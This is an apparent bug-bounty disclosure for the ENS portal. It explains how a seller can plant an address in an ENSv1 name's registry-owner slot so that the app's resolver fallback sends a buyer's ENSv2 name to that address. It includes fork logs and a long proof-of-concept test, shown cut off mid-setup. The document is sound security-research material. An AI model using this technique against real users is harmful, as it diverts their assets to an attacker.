# 92880 w a critical explorer transfers a user s ensv2 name to a separate address the seller selected before the sale

**Submitted on Sep 13th 2026 at 01:52:52 UTC by @v4rvl for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #92880
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* **Impacts:**
  * Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient, such as: - resolving or rendering an ENS name to an attacker-controlled address - showing the wrong recipient or amount on a transaction the user then approves

## Description

## Summary

An ENSv1 seller can choose a separate address, place it in the name's registry-owner slot with BaseRegistrar.reclaim, clear the resolver, and then sell the ERC-721. The Explorer later treats that registry controller as though it were the name's resolved address.

The buyer controls two accounts. Their recipient account buys the ENSv1 name, while their connected account holds an ENSv2 name. When they enter the ENSv1 name to move the ENSv2 name between those accounts, Explorer displays the seller's chosen address with no resolution error. The shipped transaction flow transfers the ENSv2 name to that address.

This is a normal account-consolidation action. The recipient control explicitly invites an `ENS name or address`, and the PoC locates that exact field before typing. A user can enter the name held by their destination account instead of copying its raw address. No attacker-supplied link or off-application transaction is required.

The fork run uses separate private keys for seller 0x221D...5E09, chosen address 0xB3fa...3896, and intended recipient 0x57d6...A470. The seller's key prepares the name and sells it. The chosen address's key later performs successful registry writes. The intended recipient's key repairs the owner slot in the control. The shipped subject flow transfers the user's ENSv2 name to 0xB3fa...3896, while the corrected control transfers a separate name to 0x57d6...A470.

## Root cause

The shared name-or-address resolver first asks the Universal Resolver for an address. If that returns nothing, apps/portal/src/features/roles/helpers/addUser.handlers.ts substitutes an ENS owner:

```ts
const resolved = await getEnsAddress(client, {
  name: nameOrAddress,
  universalResolverAddress,
})

let resolvedAddress = resolved

if (!resolvedAddress) {
  const ownerResult = await getEnsOwner({ name: nameOrAddress })
  if (ownerResult.isOk()) {
    resolvedAddress = ownerResult.value?.owner ?? null
  }
}

return resolvedAddress
```

For unwrapped ENSv1 second-level names, ownership has two fields:

* registrant: the BaseRegistrar ERC-721 holder
* owner: the ENS registry controller for the name's records

apps/portal/src/utils/ens/resolveEnsOwner.ts keeps owner and discards registrant:

```ts
const v1Owner = await getOwnerV1(client, { name })
if (v1Owner?.owner && v1Owner.owner !== zeroAddress) {
  return {
    owner: v1Owner.owner,
    registryAddress: v1EthRegistry,
    protocolVersion: 'ENSv1',
  }
}
```

The runtime read after the sale shows the two fields directly:

```
[2 SALE] ensjs getOwner v1 = {"registrant":"0x57d6759c3bd4f79f5997F8f3BbD5D88030fBA470","owner":"0xB3fa1A82fD6b67accF1689cfB285e49233023896","ownershipLevel":"registrar"}
```

The transfer form consumes that fallback result without distinguishing it from a real resolution. apps/portal/src/features/transfer/components/SendNameForm.tsx uses it as recipient:

```ts
const resolution = useAddressResolution(recipientInput)
const { address: recipient, isResolving } = resolution

const runTransfer = () => {
  if (!recipient || !canStart) return
  startTransfer({ recipient, options: effectiveOptions })
}
```

The final transfer helper encodes the same recipient into the ERC-1155 transfer:

```ts
const data = encodeFunctionData({
  abi: erc1155Abi,
  functionName: 'safeTransferFrom',
  args: [walletWithAccount.account.address, recipient, tokenId, 1n, '0x'],
})
```

The ENS contracts behave as designed. The application defect is treating the ENSv1 registry controller as a resolved recipient when the Universal Resolver returned no address.

## Measured execution

The subject, nike.eth, existed before the run. At the fork pin it was unwrapped, unexpired, held by a plain EOA, and resolved normally:

```
[F1] nike.eth at fork block 11692642 (chain timestamp 1789262136): registrant=0x7F1266aa4E48567f42E02E9dA040eeec33EDd5Cb registryOwner=0x7F1266aa4E48567f42E02E9dA040eeec33EDd5Cb v1Resolver=0x8FADE66B79cC9f707aB26799354482EB93a5B7dD expires=2231014824
[F1] universalResolver addr(60) at the pin = 0x7F1266aa4E48567f42E02E9dA040eeec33EDd5Cb
```

After the seller acquired it, three signed writes created the condition and selected a distinct destination:

```
[1 SELECT] write 0: BaseRegistrar.reclaim(labelhash, 0x221D82a4241D9a8DC0e3f8b7E3ad63d8E4E15E09) sent by 0x221D82a4241D9a8DC0e3f8b7E3ad63d8E4E15E09 status=success; registryOwner read back = 0x221D82a4241D9a8DC0e3f8b7E3ad63d8E4E15E09
[1 SELECT] write 1: ENS.setResolver(node, 0x0) sent by 0x221D82a4241D9a8DC0e3f8b7E3ad63d8E4E15E09 status=success
[1 SELECT] after write 1: registryOwner=0x221D82a4241D9a8DC0e3f8b7E3ad63d8E4E15E09 v1Resolver=0x0000000000000000000000000000000000000000 universalResolver addr(60) = null app getResolvedAddress = 0x221D82a4241D9a8DC0e3f8b7E3ad63d8E4E15E09
[1 SELECT] write 2: BaseRegistrar.reclaim(labelhash, 0xB3fa1A82fD6b67accF1689cfB285e49233023896) sent by 0x221D82a4241D9a8DC0e3f8b7E3ad63d8E4E15E09 status=success
[1 SELECT] after write 2: registrant=0x221D82a4241D9a8DC0e3f8b7E3ad63d8E4E15E09 registryOwner=0xB3fa1A82fD6b67accF1689cfB285e49233023896 v1Resolver=0x0000000000000000000000000000000000000000
[1 SELECT] after write 2: universalResolver addr(60) = null app getResolvedAddress = 0xB3fa1A82fD6b67accF1689cfB285e49233023896
```

The final reclaim is the selection. Its address argument is neither the registrant, the prior slot holder, nor the sender. Reclaim preserves the zero resolver, so the application immediately changes its answer to the selected address.

The seller then transfers the ENSv1 ERC-721 to the victim:

```
[2 SALE] transferFrom(0x221D82a4241D9a8DC0e3f8b7E3ad63d8E4E15E09 -> 0x57d6759c3bd4f79f5997F8f3BbD5D88030fBA470) sent by 0x221D82a4241D9a8DC0e3f8b7E3ad63d8E4E15E09 status=success
[2 SALE] registrant now=0x57d6759c3bd4f79f5997F8f3BbD5D88030fBA470 v1RegistryOwner still=0xB3fa1A82fD6b67accF1689cfB285e49233023896
[2 SALE] app getResolvedAddress before=0xB3fa1A82fD6b67accF1689cfB285e49233023896 after=0xB3fa1A82fD6b67accF1689cfB285e49233023896
```

The chosen address then signs two registry writes after the sale. Both succeed, and the second restores the zero-resolver condition:

```
[3 AUTH] SELECTED ENS.setResolver(non-zero) status=success; resolver read back = 0x57f1887a8BF19b14fC0dF6Fd9B2acc9Af147eA85
[3 AUTH] SELECTED ENS.setResolver(0x0) status=success; resolver read back = 0x0000000000000000000000000000000000000000
[3 AUTH] registrant unchanged = 0x57d6759c3bd4f79f5997F8f3BbD5D88030fBA470; app getResolvedAddress = 0xB3fa1A82fD6b67accF1689cfB285e49233023896
```

The user controls both the connected sender and the separate account holding the typed ENSv1 name. The shipped route renders neither account. It renders the selected address, enables the button, runs its default plan, and transfers the token:

```
[4 before] {"name":"plant62161143a.eth","typed":"nike.eth","latestOwner":"0x2fd788a75945F47291b7CB32723a914e162b2262","balVictim":"1","balAttacker":"0","balSelected":"0","typedNameRegistrant":"0x57d6759c3bd4f79f5997F8f3BbD5D88030fBA470","typedNameRegistryOwner":"0xB3fa1A82fD6b67accF1689cfB285e49233023896"}
[4A route] {"pathname":"/plant62161143a.eth/ownership/transfer","formRendered":true,"irreversibilityWarningRendered":true,"ownerGateRefused":false,"roleGateRefused":false,"walletNotConnected":false}
[4B field] {"typed":"nike.eth","fieldText":"Recipient0xB3fa1A82fD6b67accF1689cfB285e49233023896","fullAddressesRendered":["0xB3fa1A82fD6b67accF1689cfB285e49233023896"],"rendersAttacker":false,"rendersSelected":true,"rendersVictim":false,"rendersVictimRecipient":false,"couldNotResolveLines":0,"selfRefusal":false,"zeroRefusal":false,"transferButtonEnabled":true}
[4C flow] {"iterations":4,"stepLabelsSeen":["Detach resolver","Transfer name"]}
[4C TransferSingle] {"moves":[{"txHash":"0x2864ec33420abbfe6116769153c61ad468361133ea77af6d1f48e521b1f4ef99","from":"0x2fd788a75945F47291b7CB32723a914e162b2262","to":"0xB3fa1A82fD6b67accF1689cfB285e49233023896","id":"76519069716411153654304546449785477817012813006070165002172779298550399893504"}]}
[4 TERMINAL] {"name":"plant62161143a.eth","latestOwner":"0xB3fa1A82fD6b67accF1689cfB285e49233023896","balVictim":"0","balAttacker":"0","balSelected":"1"}
[4 RECOVERY] {"hasRoles(ROLE_CAN_TRANSFER_ADMIN, VICTIM)":false,"hasRoles(ROLE_CAN_TRANSFER_ADMIN, SELECTED)":true,"VICTIM safeTransferFrom(SELECTED -> VICTIM) status":"reverted","balVictimAfterClawbackAttempt":"0","balAttackerAfterClawbackAttempt":"0","balSelectedAfterClawbackAttempt":"1"}
```

The seller receives nothing. The separate selected address receives the name and becomes its owner.

## One-condition control

The victim's intended recipient account calls BaseRegistrar.reclaim on the same ENSv1 name. That changes only the registry-owner slot. The registrant remains 0x57d6...A470, and the resolver remains zero.

The same connected account enters the same name in the same form for a separate control token. This time the field displays 0x57d6...A470, and the shipped flow transfers the control token to that intended account:

```
[5 CONTROL] executed endpoint: BaseRegistrar(0x57f1887a8BF19b14fC0dF6Fd9B2acc9Af147eA85).reclaim(labelhash, 0x57d6759c3bd4f79f5997F8f3BbD5D88030fBA470) from 0x57d6759c3bd4f79f5997F8f3BbD5D88030fBA470 status=success
[5 CONTROL] v1RegistryOwner before=0xB3fa1A82fD6b67accF1689cfB285e49233023896 after=0x57d6759c3bd4f79f5997F8f3BbD5D88030fBA470; registrant unchanged=0x57d6759c3bd4f79f5997F8f3BbD5D88030fBA470; resolver still=0x0000000000000000000000000000000000000000
[5 CONTROL] app getResolvedAddress before=0xB3fa1A82fD6b67accF1689cfB285e49233023896 after=0x57d6759c3bd4f79f5997F8f3BbD5D88030fBA470
[5 CONTROL] SELECTED ENS.setResolver on the same name after reclaim status=reverted
[5B field] {"typed":"nike.eth","fieldText":"Recipient0x57d6759c3bd4f79f5997F8f3BbD5D88030fBA470","fullAddressesRendered":["0x57d6759c3bd4f79f5997F8f3BbD5D88030fBA470"],"rendersAttacker":false,"rendersSelected":false,"rendersVictim":false,"rendersVictimRecipient":true,"couldNotResolveLines":0,"selfRefusal":false,"zeroRefusal":false,"transferButtonEnabled":true}
[5C TransferSingle] {"moves":[{"txHash":"0x3ecf4b1c1f42a36df97eb72e5abebaf8529abbf1e2964b41e089064bf3034096","from":"0x2fd788a75945F47291b7CB32723a914e162b2262","to":"0x57d6759c3bd4f79f5997F8f3BbD5D88030fBA470","id":"8205197421965058777301394699707773939547840151203270104235664300630486286336"}]}
[5 TERMINAL] {"name":"plant62161143b.eth","latestOwner":"0x57d6759c3bd4f79f5997F8f3BbD5D88030fBA470","balVictim":"0","balVictimRecipient":"1","balAttacker":"0"}
```

## Preconditions and limits

* The attacker must control an unwrapped ENSv1 second-level name, prepare its registry-owner and resolver state, and sell it to one of the victim's accounts.
* The victim must later use that purchased name in Explorer's `ENS name or address` recipient field while transferring a separate ENSv2 name from another account, such as when consolidating assets.
* The victim interacts with the application and approves the displayed flow. This report does not claim a zero-interaction action.
* The application displays the full address and a general irreversibility warning. It does not disclose the failed name resolution or the owner substitution.
* The buyer can repair the ENSv1 state on chain by calling reclaim before using the name. The Explorer neither performs that call nor blocks this transfer while it remains outstanding.

A second control enters a syntactically valid name for which the complete resolution chain returns null. The app uses its declared unresolved state, prints Could not resolve an address, disables the button, and emits no transfer:

```
[6 REFUSE] plant62161143z.eth v1RegistryOwner=0x0000000000000000000000000000000000000000 app getResolvedAddress = null
[6B field] {"couldNotResolveLines":1,"transferButtonEnabled":false}
[6 TERMINAL] {"name":"plant62161143c.eth","latestOwner":"0x2fd788a75945F47291b7CB32723a914e162b2262","balVictim":"1","balAttacker":"0","movesOfThisToken":0}
```

These controls isolate the stale owner slot. With that slot corrected, the same form and transaction plan send the control name to the intended account. With no fallback value, the app refuses to transfer.

## Why this matches Critical

The claimed row is:

> Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient, such as: resolving or rendering an ENS name to an attacker-controlled address; showing the wrong recipient or amount on a transaction the user then approves.

| Predicate                                        | Measurement                                                                                                                                            |
| ------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------ |
| The application displays an address              | The Recipient field renders the full chosen address 0xB3fa...3896.                                                                                     |
| The address is incorrect for the typed name      | The Universal Resolver returns null, and the name's ERC-721 registrant is the victim-controlled intended account 0x57d6...A470, not 0xB3fa...3896.     |
| The address is attacker-controlled               | The seller selects it as the free address argument to reclaim before the victim owns the name. The address later signs two successful registry writes. |
| The user submits a transaction                   | The shipped transfer flow emits TransferSingle from the victim.                                                                                        |
| The transaction reaches the unintended recipient | The event recipient, latestOwner, and closing balance all name 0xB3fa...3896. The victim closes at zero.                                               |
| Causality                                        | Changing only the registry-owner slot from 0xB3fa...3896 to 0x57d6...A470 makes the same form transfer a control token to 0x57d6...A470.               |

## Scope and test fidelity

All defective code is in apps/portal. The test uses the shipped route, form, resolution helpers, plan builder, transfer helper, and transaction modal. It contains no vi.mock call and replaces no application module or contract behavior.

The ENSv1 name already exists on Sepolia, and the test neither registers one nor grants a legacy controller. The seller, selected address, and intended victim recipient use separate private keys. Anvil impersonation is limited to fixture setup by the existing holder and ENSv2 registrar. A fetch guard permits only 127.0.0.1:8664, so no transaction reaches a public network.

## Proof of Concept

## Steps to reproduce

1. From the audited repository root, start a fresh private fork:

```sh
anvil --fork-url https://ethereum-sepolia-rpc.publicnode.com \
  --port 8664 --chain-id 11155111 --auto-impersonate --silent
```

2. Save the proof below as apps/portal/src/**poc\_92616plant**/plant\_by\_reclaim\_moves\_the\_name.poc.test.tsx.
3. Run:

```sh
pnpm --filter portal exec vitest run \
  src/__poc_92616plant__/plant_by_reclaim_moves_the_name.poc.test.tsx \
  --no-file-parallelism --reporter=verbose --silent=false
```

A fresh run produced:

```
Test Files  1 passed (1)
Tests       7 passed (7)
Duration    51.47s
```

The test derives its ENSv2 labels from the current time, so label names, token IDs, blocks, and transaction hashes change between runs. The actor addresses, state transitions, balances, event destinations, role booleans, and verdicts remain invariant.

## Proof of concept

`apps/portal/src/__poc_92616plant__/plant_by_reclaim_moves_the_name.poc.test.tsx`

```tsx
/** @vitest-environment happy-dom */

import { extendChainWithEns } from '@ensdomains/ensjs/chain'
import { getOwner as getOwnerV1 } from '@ensdomains/ensjs/public/v1'
import {
  getTokenId as ensjsGetTokenId,
  hasRoles as ensjsHasRoles,
} from '@ensdomains/ensjs/public/v2'
import { permissionedRegistryGetStateSnippet } from '@ensdomains/ensjs-abi/v2/permissionedRegistry'
import { proxyDeployedEventSnippet } from '@ensdomains/ensjs-abi/v2/verifiableFactory'
import {
  createMemoryHistory,
  createRouter,
  RouterProvider,
} from '@tanstack/react-router'
import { render, waitFor } from '@testing-library/react'
import userEvent from '@testing-library/user-event'
import {
  type Address,
  createPublicClient,
  createWalletClient,
  decodeEventLog,
  encodeFunctionData,
  erc1155Abi,
  getAddress,
  type Hex,
  http,
  keccak256,
  namehash,
  type PublicClient,
  parseAbi,
  toHex,
  zeroAddress,
} from 'viem'
import { type PrivateKeyAccount, privateKeyToAccount } from 'viem/accounts'
import { getEnsAddress } from 'viem/actions'
import { sepolia } from 'viem/chains'
import { afterAll, beforeAll, describe, expect, it, vi } from 'vitest'

const FORK = 'http://127.0.0.1:8664'
const ALLOWED_HOST = '127.0.0.1:8664'

// ---------------------------------------------------------------------------
// fetch guard, module scope so it precedes every import-time transport
// ---------------------------------------------------------------------------
const refusedHosts: string[] = []
let allowedRequests = 0
const realFetch = globalThis.fetch
globalThis.fetch = (async (input: RequestInfo | URL, init?: RequestInit) => {
  const url =
    typeof input === 'string'
      ? input
      : input instanceof URL
        ? input.href
        : input.url
  let host = ''
  try {
    host = new URL(url).host
  } catch {
    host = String(url)
  }
  if (host !== ALLOWED_HOST) {
    refusedHosts.push(host)
    throw new Error(`[92616plant] refused non-fork host: ${host}`)
  }
  allowedRequests += 1
  return realFetch(input, init)
}) as typeof fetch

// ---------------------------------------------------------------------------
// fixture identities. Lane-namespaced keys; NEVER anvil #0/#1, which carry an
// EIP-7702 delegation designator on this Sepolia fork (asserted in F0).
//
// There is no MINTER in this run and no ENSv1 registration. The ENSv1 name is
// one that already exists at the fork block; SELLER is read off the chain as
// its current ERC-721 holder.
// ---------------------------------------------------------------------------
const ATTACKER_ACCOUNT = privateKeyToAccount(
  keccak256(toHex('92616plant-attacker-v1')),
)
const ATTACKER: Address = getAddress(ATTACKER_ACCOUNT.address)
const VICTIM_ACCOUNT = privateKeyToAccount(
  keccak256(toHex('92616plant-victim-v1')),
)
const VICTIM: Address = getAddress(VICTIM_ACCOUNT.address)
// A second account controlled by the same user. It buys the ENSv1 name and is
// the intended recipient when VICTIM transfers an ENSv2 name between accounts.
const VICTIM_RECIPIENT_ACCOUNT = privateKeyToAccount(
  keccak256(toHex('92616plant-victim-recipient-v1')),
)
const VICTIM_RECIPIENT: Address = getAddress(VICTIM_RECIPIENT_ACCOUNT.address)
// A second address controlled by ATTACKER. ATTACKER writes this address into
// the ENSv1 registry-owner slot before the sale, and the application later
// delivers the victim's ENSv2 name to it.
const ATTACKER_ALT_ACCOUNT = privateKeyToAccount(
  keccak256(toHex('92616plant-attacker-alt-v1')),
)
const ATTACKER_ALT: Address = getAddress(ATTACKER_ALT_ACCOUNT.address)

// The app reads these at module scope, so they are set before any import of
// `@/lib/wagmi` or `@/lib/mockWallet.mock`. `VITE_USE_MOCK_WALLET` is the
// repository's own local-development flag; `mockWallet.mock.ts:5-12` documents
// it and says to point `VITE_SEPOLIA_RPC_URL` at a local node.
vi.stubEnv('VITE_SEPOLIA_RPC_URL', FORK)
vi.stubEnv('VITE_USE_MOCK_WALLET', 'true')
vi.stubEnv('VITE_MOCK_ACCOUNT', VICTIM)

// The ENSv1 subject. Registered on Sepolia before this run, unwrapped, held by
// an externally owned account, and resolving normally at the fork block. Every
// one of those properties is read back and asserted in F1.
const V1_LABEL = 'nike'
const V1_NAME = `${V1_LABEL}.eth`
const SUFFIX = String(Date.now()).slice(-8)
const ABSENT = `plant${SUFFIX}z.eth`
const V2_SUBJECT_A = `plant${SUFFIX}a`
const V2_CONTROL = `plant${SUFFIX}b`
const V2_REFUSAL = `plant${SUFFIX}c`
const V2_LABELS = [V2_SUBJECT_A, V2_CONTROL, V2_REFUSAL]

// contract addresses, all from the apps' own chain configs
const V1_REGISTRY: Address = '0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e'
const V1_BASE_REGISTRAR: Address = '0x57f1887a8BF19b14fC0dF6Fd9B2acc9Af147eA85'
const NAME_WRAPPER: Address = '0x0635513f179D50A207757E05759CbD106d7dFcE8'
const V2_ETH_REGISTRY: Address = '0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2'
const V2_ETH_REGISTRAR: Address = '0xa88553F454b77203B0D036A05c894d555EAAa2Cc'
const VERIFIABLE_FACTORY: Address = '0x10dC6333CDFe1FCEf624c6e0a8221b91804Cd7ef'
const PERMISSIONED_RESOLVER_IMPL: Address =
  '0x9EAe5C2730a7dD16BDD1DeE6421a1B91e3B0365e'

// registration.actors.ts:71-73
const DEDICATED_RESOLVER_ROLE_BITMAP = BigInt(
  '0x1111111111111111111111111111111111111111111111111111111111111111',
)
const ROLE_SET_RESOLVER = 1n << 24n
const ROLE_SET_RESOLVER_ADMIN = 1n << 152n
const ROLE_SET_SUBREGISTRY = 1n << 20n
const ROLE_SET_SUBREGISTRY_ADMIN = 1n << 148n
const ROLE_CAN_TRANSFER_ADMIN = (1n << 28n) << 128n
const ROLE_BITMAP =
  ROLE_SET_RESOLVER |
  ROLE_SET_RESOLVER_ADMIN |
  ROLE_SET_SUBREGISTRY |
  ROLE_SET_SUBREGISTRY_ADMIN |
  ROLE_CAN_TRANSFER_ADMIN
const TEN_YEARS = 315_360_000n

const forkChain = extendChainWithEns(sepolia)
const pub = createPublicClient({
  chain: forkChain,
  transport: http(FORK),
}) as PublicClient

const rpc = (method: string, params: unknown[]) =>
  fetch(FORK, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ jsonrpc: '2.0', id: 1, method, params }),
  }).then(
    (r) =>
      r.json() as Promise<{
        result?: string
        error?: { code?: number; message?: string; data?: unknown }
      }>,
  )

const sendFrom = async (
  from: Address,
  to: Address,
  data: string,
  gas = '0x2DC6C0',
) => {
  const r = await rpc('eth_sendTransaction', [{ from, to, data, gas }])
  await rpc('evm_mine', [])
  if (!r.result) {
    return {
      status: 'rpc-rejected' as const,
      hash: null,
      rpcMessage: r.error?.message ?? null,
      revertData: (r.error?.data ?? null) as string | null,
    }
  }
  const receipt = await pub.getTransactionReceipt({
    hash: r.result as `0x${string}`,
  })
  return {
    status: receipt.status,
    hash: r.result as `0x${string}`,
    rpcMessage: null,
    revertData: null,
  }
}

const sendSigned = async (
  account: PrivateKeyAccount,
  to: Address,
  data: Hex,
  gas = 3_000_000n,
) => {
  const wallet = createWalletClient({
    account,
    chain: forkChain,
    transport: http(FORK),
  })
  const hash = await wallet.sendTransaction({ to, data, gas })
  const receipt = await pub.waitForTransactionReceipt({ hash })
  return { status: receipt.status, hash }
}

const registryAbi = parseAbi([
  'function owner(bytes32 node) view returns (address)',
  'function resolver(bytes32 node) view returns (address)',
  'function setResolver(bytes32 node, address resolver)',
])
const registrarAbi = parseAbi([
  'function owner() view returns (address)',
  'function ownerOf(uint256 id) view returns (address)',
  'function nameExpires(uint256 id) view returns (uint256)',
  'function controllers(address) view returns (bool)',
  'function transferFrom(address from, address to, uint256 id)',
  'function reclaim(uint256 id, address owner)',
])
const v2RegisterAbi = parseAbi([
  'function register(string label, address owner, address registry, address resolver, uint256 roleBitmap, uint64 expiry) returns (uint256)',
])
const liveResolverAbi = parseAbi([
  'function getResolver(string) view returns (address)',
])

const labelhashOf = (label: string) => BigInt(keccak256(toHex(label)))

const getState = (tokenId: bigint) =>
  pub.readContract({
    address: V2_ETH_REGISTRY,
    abi: permissionedRegistryGetStateSnippet,
    functionName: 'getState',
    args: [tokenId],
  })

const balanceOf = (owner: Address, tokenId: bigint) =>
  pub.readContract({
    address: V2_ETH_REGISTRY,
    abi: erc1155Abi,
    functionName: 'balanceOf',
    args: [owner, tokenId],
  })

const tokenIdOnChain = (label: string) =>
  ensjsGetTokenId(pub as never, { label, registryAddress: V2_ETH_REGISTRY })

const registryResolverOf = (label: string) =>
  pub.readContract({
    address: V2_ETH_REGISTRY,
    abi: liveResolverAbi,
    functionName: 'getResolver',
    args: [label],
  }) as Promise<Address>

const jsonBig = (v: unknown) =>
  JSON.stringify(v, (_k, val) =>
    typeof val === 'bigint' ? val.toString() : val,
  )

const v1State = async (name: string, label: string) => {
  const node = namehash(name)
  const [registryOwner, resolver, registrant] = await Promise.all([
    pub.readContract({
      address: V1_REGISTRY,
      abi: registryAbi,
      functionName: 'owner',
      args: [node],
    }),
    pub.readContract({
      address: V1_REGISTRY,
      abi: registryAbi,
      functionName: 'resolver',
      args: [node],
    }),
    pub.readContract({
      address: V1_BASE_REGISTRAR,
      abi: registrarAbi,
      functionName: 'ownerOf',
      args: [labelhashOf(label)],
    }),
  ])
  return { registrant, registryOwner, resolver }
}

const deployDedicatedResolver = async (
  seed: string,
  owner: Address,
): Promise<Address> => {
  const block = await pub.getBlock({ blockTag: 'latest' })
  const salt = BigInt(keccak256(toHex(`${seed}-${block.number}`)))
  const data = encodeFunctionData({
    abi: parseAbi([
      'function deployProxy(address implementation, uint256 salt, bytes data) returns (address)',
    ]),
    functionName: 'deployProxy',
    args: [
      PERMISSIONED_RESOLVER_IMPL,
      salt,
      encodeFunctionData({
        abi: parseAbi([
          'function initialize(address owner, uint256 bitmap, bytes[] setters)',
        ]),
        functionName: 'initialize',
        args: [owner, DEDICATED_RESOLVER_ROLE_BITMAP, []],
      }),
    ],
  })
  const res = await sendFrom(owner, VERIFIABLE_FACTORY, data)
  expect(res.status).toBe('success')
  if (!res.hash) throw new Error(`missing deployment hash for ${seed}`)
  const receipt = await pub.getTransactionReceipt({ hash: res.hash })
  const topic0 = keccak256(
    toHex('ProxyDeployed(address,address,uint256,address)'),
  )
  for (const log of receipt.logs) {
    try {
      const decoded = decodeEventLog({
        abi: [proxyDeployedEventSnippet],
        data: log.data,
        topics: log.topics,
      })
      if (decoded.eventName === 'ProxyDeployed') {
        return (decoded.args as { proxyAddress: Address }).proxyAddress
      }
    } catch {
      // fall through to the topic match below
    }
  }
  for (const log of receipt.logs) {
    if (
      log.address.toLowerCase() === VERIFIABLE_FACTORY.toLowerCase() &&
      log.topics[0] === topic0 &&
      log.topics.length >= 3
    ) {
      return getAddress(`0x${log.topics[2].slice(-40)}`)
    }
  }
  throw new Error(`no ProxyDeployed event for ${seed}`)
}

// ---------------------------------------------------------------------------
// modules that read the wagmi config must load AFTER the env is set
// ---------------------------------------------------------------------------
// biome-ignore lint/suspicious/noExplicitAny: generated route tree
let routeTree: any
// biome-ignore lint/suspicious/noExplicitAny: app query client
let appQueryClient: any
// biome-ignore lint/suspicious/noExplicitAny: ensjs client shape
let ensClient: any
// biome-ignore lint/suspicious/noExplicitAny: app resolution query
let getResolvedAddress: any
let universalResolverAddress: Address

const ids: Record<string, bigint> = {}
let SELLER: Address = zeroAddress

const appAnswerFor = async (nameOrAddress: string) => {
  appQueryClient.clear()
  const result = await getResolvedAddress({ nameOrAddress })
  return result.isOk() ? String(result.value) : `ERR ${String(result.error)}`
}

const urAddrFor = async (name: string) =>
  getEnsAddress(pub, { name, universalResolverAddress }).catch(
    (e) => `THREW ${String(e).slice(0, 80)}`,
  )

beforeAll(async () => {
  expect(await pub.getChainId()).toBe(11155111)

  // hazard 7: an account carrying a 7702 delegation designator makes every
  // ERC-1155 receive revert ERC1155InvalidReceiver, which reads exactly like an
  // authorization failure. Assert every fixture account is a plain EOA.
  for (const [who, addr] of [
    ['ATTACKER', ATTACKER],
    ['ATTACKER_ALT', ATTACKER_ALT],
    ['VICTIM', VICTIM],
    ['VICTIM_RECIPIENT', VICTIM_RECIPIENT],
  ] as const) {
    const code = await pub.getBytecode({ address: addr })
    console.log(`[F0] ${who} ${addr} code = ${code ?? '0x'}`)
    expect(code ?? '0x').toBe('0x')
  }

  const block0 = await pub.getBlock({ blockTag: 'latest' })

  // F1. The ENSv1 subject exists on chain BEFORE this run touches anything.
  // Nothing here is a write.
  const pin = await v1State(V1_NAME, V1_LABEL)
  SELLER = pin.registrant as Address
  const sellerCode = (await pub.getBytecode({ address: SELLER })) ?? '0x'
  const expires = (await pub.readContract({
    address: V1_BASE_REGISTRAR,
    abi: registrarAbi,
    functionName: 'nameExpires',
    args: [labelhashOf(V1_LABEL)],
  })) as bigint
  const pinUr = await urAddrFor(V1_NAME)
  console.log(
    `[F1] ${V1_NAME} at fork block ${block0.number} (chain timestamp ${block0.timestamp}): registrant=${pin.registrant} registryOwner=${pin.registryOwner} v1Resolver=${pin.resolver} expires=${expires}`,
  )
  console.log(
    `[F1] current ERC-721 holder ${SELLER} code = ${sellerCode} (an EOA can originate a transaction; a contract cannot)`,
  )
  console.log(`[F1] universalResolver addr(60) at the pin = ${String(pinUr)}`)
  // unwrapped: the NameWrapper does not hold the ERC-721
  expect(pin.registrant).not.toBe(NAME_WRAPPER)
  // the holder is an externally owned account, so every write below could be
  // sent by the party the run says sends it
  expect(sellerCode).toBe('0x')
  // unexpired at the fork block
  expect(expires > block0.timestamp).toBe(true)
  // hazard 5: a fork carrying another run's state would fail here
  expect(pin.registryOwner).toBe(SELLER)
  expect(pin.resolver).not.toBe(zeroAddress)
  // the name resolves normally at the pin: the fallback is NOT reached yet
  expect(String(pinUr).startsWith('0x')).toBe(true)

  // W1
  for (const a of [
    ATTACKER,
    ATTACKER_ALT,
    VICTIM,
    VICTIM_RECIPIENT,
    SELLER,
    V2_ETH_REGISTRAR,
  ]) {
    await rpc('anvil_setBalance', [a, '0x3635C9ADC5DEA00000'])
  }

  // W2. ATTACKER acquires the existing name. An ordinary ERC-721 transfer, sent
  // by the current holder, who is an EOA (asserted above). It stands in for a
  // secondary-market purchase; no payment is modelled.
  const buy = await sendFrom(
    SELLER,
    V1_BASE_REGISTRAR,
    encodeFunctionData({
      abi: registrarAbi,
      functionName: 'transferFrom',
      args: [SELLER, ATTACKER, labelhashOf(V1_LABEL)],
    }),
  )
  console.log(
    `[F2] ACQUISITION BaseRegistrar.transferFrom(${SELLER} -> ${ATTACKER}, labelhash) sent by ${SELLER} status=${buy.status} tx=${buy.hash}`,
  )
  expect(buy.status).toBe('success')
  const afterBuy = await v1State(V1_NAME, V1_LABEL)
  console.log(
    `[F2] after the acquisition: registrant=${afterBuy.registrant} registryOwner=${afterBuy.registryOwner} v1Resolver=${afterBuy.resolver}`,
  )
  expect(afterBuy.registrant).toBe(ATTACKER)

  // W3 + W4 + W5. VICTIM's three ENSv2 names, one per driven arm.
  const block = await pub.getBlock({ blockTag: 'latest' })
  const expiry = block.timestamp + TEN_YEARS
  console.log(
    `[F3] chainNow = ${block.timestamp} v2 expiry = ${expiry} (fork block ${block.number})`,
  )
  for (const label of V2_LABELS) {
    ids[label] = await tokenIdOnChain(label)
    const existing = await getState(ids[label])
    if (existing.latestOwner !== zeroAddress) {
      throw new Error(
        `[F3] label ${label} already registered on this fork to ${existing.latestOwner}; restart the fork`,
      )
    }
    const resolver = await deployDedicatedResolver(
      `92616plant-${label}`,
      VICTIM,
    )
    const res = await sendFrom(
      V2_ETH_REGISTRAR,
      V2_ETH_REGISTRY,
      encodeFunctionData({
        abi: v2RegisterAbi,
        functionName: 'register',
        args: [label, VICTIM, zeroAddress, resolver, ROLE_BITMAP, expiry],
      }),
    )
    if (res.status !== 'success') {
      console.log(
        '[F3] v2 register FAILED',
        jsonBig({
          label,
          rpcMessage: res.rpcMessage,
          revertData: res.revertData,
        }),
      )
    }
    expect(res.status).toBe('success')

    const live = await registryResolverOf(label)
